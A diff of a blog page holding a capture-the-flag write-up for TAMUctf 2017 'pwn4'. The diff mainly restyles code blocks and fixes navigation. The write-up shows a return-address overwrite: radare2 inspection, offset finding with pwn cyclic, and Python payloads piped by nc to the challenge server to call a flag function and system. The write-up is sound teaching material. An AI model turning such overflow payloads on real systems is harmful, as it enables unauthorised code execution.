@@ -30,6 +30,7 @@
     <link rel="stylesheet" href="https://storage.googleapis.com/code.getmdl.io/1.1.3/material.grey-orange.min.css"/>
     <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
     <link rel="stylesheet" href="/css/hmdl-style.css"/>
+	<link rel="stylesheet" href="/css/pygment.css">
 
 
 
@@ -74,7 +75,7 @@
 							<strong>
                             		<strong>Tzaoh</strong>
 							</strong>
-                            <span>May 29, 2017</span>
+                            <span>May 30, 2017</span>
                         </div>
                         <div class="section-spacer"></div>
                     </div>
@@ -86,8 +87,8 @@
 <p>Is curious that this specific challenge is more worthy than the previous one (<a href="../pwn3/pwn3.md">pwn3</a>). As we will see it is way easier.</p>
 
 <p>Lets take a look to the code with r2</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ r2 pwn4 -c <span style="color: #e6db74">&#39;aaa; afl&#39;</span>
-</pre></div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ r2 pwn4 -c <span class="s1">&#39;aaa; afl&#39;</span>
+</code></pre></div>
 
 <p><img src="/assets/2-pwn4_functions.png" alt="Pwn4 functions" /></p>
 
@@ -99,9 +100,9 @@
 <li><strong><code>sym.func1()</code></strong> at <code>0x080484fd</code></li>
 <li><strong><code>sym.main()</code></strong> at <code>0x08048515</code></li>
 </ul>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span><span style="color: #f92672">[</span>0x080483d0<span style="color: #f92672">]</span>&gt; s sym.flag_func<span style="color: #f8f8f2">;</span> V<span style="color: #f8f8f2">;</span> p<span style="color: #f8f8f2">;</span> p
-<span style="color: #75715e"># be positioned at start of sym.flag_func; Change to Visual mode; change mode view*2</span>
-</pre></div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="o">[</span>0x080483d0<span class="o">]</span>&gt; s sym.flag_func<span class="p">;</span> V<span class="p">;</span> p<span class="p">;</span> p
+<span class="c1"># be positioned at start of sym.flag_func; Change to Visual mode; change mode view*2</span>
+</code></pre></div>
 
 <p>Here they are, take a look at them.</p>
 
@@ -121,28 +122,28 @@ Thanks to this function we would be able to overwrite the <strong><code>$eip</co
 </ol>
 
 <p>Lets figure out, how many bytes do we need to overwrite <strong><code>$eip</code></strong> register.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span><span style="color: #f92672">[</span>0x080484f7<span style="color: #f92672">]</span>&gt; q <span style="color: #75715e"># Close r2 (we need to open the binary again with debug mode).</span>
-$ pwn cyclic <span style="color: #ae81ff">40</span> <span style="color: #75715e"># To generate string with unique subsequences.</span>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="o">[</span>0x080484f7<span class="o">]</span>&gt; q <span class="c1"># Close r2 (we need to open the binary again with debug mode).</span>
+$ pwn cyclic <span class="m">40</span> <span class="c1"># To generate string with unique subsequences.</span>
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa
-$ r2 -X <span style="color: #e6db74">&quot;stdin=\&quot;`pwn cyclic 40`\&quot;&quot;</span> -d pwn4 -c <span style="color: #e6db74">&#39;aaa; dc;&#39;</span>
+$ r2 -X <span class="s2">&quot;stdin=\&quot;`pwn cyclic 40`\&quot;&quot;</span> -d pwn4 -c <span class="s1">&#39;aaa; dc;&#39;</span>
 .
 .
-<span style="color: #f92672">[</span>0x61616165<span style="color: #f92672">]</span>&gt; q
+<span class="o">[</span>0x61616165<span class="o">]</span>&gt; q
 $ pwn cyclic -l 0x61616165
-<span style="color: #ae81ff">16</span>
-</pre></div>
+<span class="m">16</span>
+</code></pre></div>
 
 <p>So, we can overwrite the <strong><code>$eip</code></strong> register writing the next following 4 bytes (from byte 17 to 20)!<br />
 Now we create a file with the previously commented file (<strong><code>flag2.txt</code></strong>) to try this out.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ <span style="color: #f8f8f2">echo</span> This is the flag &gt; flag2.txt
-$ python -c <span style="color: #e6db74">&#39;print(&quot;A&quot;*16 + &quot;\xcb\x84\x04\x08&quot;)&#39;</span> <span style="color: #f8f8f2">|</span> ./pwn4
-</pre></div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ <span class="nb">echo</span> This is the flag &gt; flag2.txt
+$ python -c <span class="s1">&#39;print(&quot;A&quot;*16 + &quot;\xcb\x84\x04\x08&quot;)&#39;</span> <span class="p">|</span> ./pwn4
+</code></pre></div>
 
 <p><img src="/assets/4-pwn4_printing_flag2.png" alt="Pwn4 printing flag2.txt" /></p>
 
 <p>Good! what will the remote server say?</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;A&quot;*16 + &quot;\xcb\x84\x04\x08&quot;)&#39;</span> <span style="color: #f8f8f2">|</span> nc pwn.ctf.tamu.edu <span style="color: #ae81ff">4324</span>
-</pre></div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;A&quot;*16 + &quot;\xcb\x84\x04\x08&quot;)&#39;</span> <span class="p">|</span> nc pwn.ctf.tamu.edu <span class="m">4324</span>
+</code></pre></div>
 
 <p><img src="/assets/5-pwn4_remote_flag2_content.png" alt="Pwn4 printing flag2.txt" /></p>
 
@@ -168,8 +169,8 @@ The only thing we need to do is to pass a different argument: <strong><code>cat 
 </code></p>
 
 <p>Lets send to the server:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;A&quot;*16 + &quot;\xd9\x84\x04\x08&quot; + &quot;\x28\xa0\x04\x08&quot;)&#39;</span> <span style="color: #f8f8f2">|</span> nc pwn.ctf.tamu.edu <span style="color: #ae81ff">4324</span>
-</pre></div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;A&quot;*16 + &quot;\xd9\x84\x04\x08&quot; + &quot;\x28\xa0\x04\x08&quot;)&#39;</span> <span class="p">|</span> nc pwn.ctf.tamu.edu <span class="m">4324</span>
+</code></pre></div>
 
 <p><img src="/assets/7-pwn4_answer.png" alt="Pwn4 printing flag2.txt" />
 Answer: gigem{R3TURN_0R13NT3D_PR0F1T}</p>
@@ -195,19 +196,13 @@ Answer: gigem{R3TURN_0R13NT3D_PR0F1T}</p>
                     </div>  
                 </div>                
                 <nav class="mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
-                    <a href="/post/tamuctf2017/pwn2/">
+                    <a href="/post/tamuctf2017/pwn3/">
                         <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                         <i class="icon ion-android-arrow-back"></i>
                         </button>
                         Older
                     </a>
                     <div class="section-spacer"></div>
-                    <a href="/post/tamuctf2017/pwn3/">
-                        Newer
-                        <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                            <i class="icon ion-android-arrow-forward"></i>
-                        </button>
-                    </a>
                 </nav>
  
             </div>        
